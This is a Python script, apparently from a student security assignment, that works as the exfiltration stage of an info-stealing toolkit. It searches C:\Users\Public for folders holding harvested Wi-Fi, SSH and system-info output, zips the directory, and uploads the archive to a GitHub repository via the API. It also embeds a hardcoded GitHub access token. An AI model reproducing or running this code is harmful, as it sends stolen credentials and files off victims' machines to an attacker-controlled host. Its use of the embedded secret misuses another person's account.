class DataExtractor():
    def __init__(self,script_name):
        self.script_name = script_name
        
    def prepare_folders(self,directory, specified_folders):
        '''This function is responsible for searching for the specified folders and returning true if they were found. This function will also call the create zip function'''
        import os
        found_folders = False
        for root, dirs, files in os.walk(directory):
            for folder in dirs:
                folder_path = os.path.join(root, folder)
                if folder in specified_folders:
                    print(folder_path)
                    found_folders = True                 
        if not found_folders:
            return False
        self.create_zip(directory)
        return True

    def create_zip(self,source_dir):
        '''This function will be called in the prepare_folders function in case that function returns true. This function will zip the found folders'''
        import shutil
        shutil.make_archive(r'C:\Users\Public\files', 'zip', source_dir)

    def send_files(self):
        '''This function will send the extracted files to my git repo'''
        import requests
        import base64
        url = "https://api.github.com/repos/rsecurity12/python_opdracht/contents/extracted_files/files.zip"
        headers = {"Authorization": "Bearer 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"}  
        file_path = r"C:\Users\Public\files.zip"  # Replace with the actual path to your zip file
        with open(file_path, "rb") as file:
            file_content = file.read()
            encoded_content = base64.b64encode(file_content).decode("utf-8")
        data = {
            "message": "Upload file",
            "content": encoded_content
        }
        response = requests.put(url, headers=headers, json=data)
        
folder_directory = r'C:\Users\Public'
specified_folders_list = ["wiFi_output", "ssh_output", "gather_info"]
dataExtractor = DataExtractor("DataExtractor")

if dataExtractor.prepare_folders(folder_directory, specified_folders_list):
    dataExtractor.send_files()
else:
    print("Nothing to extract")